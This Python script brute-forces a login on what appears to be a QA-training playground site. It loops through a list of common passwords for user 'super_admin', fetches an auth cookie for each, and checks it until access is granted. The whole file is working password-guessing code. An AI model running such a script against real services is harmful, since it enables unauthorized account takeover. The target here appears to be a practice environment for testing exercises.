import requests

valid_login = "super_admin"
valid_password = ""

passwords = ["password", "123456", "123456789", "12345678", "12345",
             "qwerty", "abc123", "1234567", "monkey", "111111", "letmein", "1234",
             "football", "1234567890", "dragon", "baseball", "sunshine", "iloveyou", "trustno1", "111111",
             "princess", "adobe123", "123123", "welcome", "login", "admin"]

for password_to_check in passwords:
    response_with_auth = requests.get("https://playground.learnqa.ru/api/get_auth_cookie", params={"login":valid_login, "password":password_to_check})

    cookie_value = response_with_auth.cookies.get('auth_cookie')
    cookies = {}
    if cookie_value is not None:
        cookies.update({'auth_cookie': cookie_value})

    response_with_auth_check = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)
    if response_with_auth_check.text == "You are authorized":
        valid_password = password_to_check
        print(f"Password was found: {valid_password}")
        break
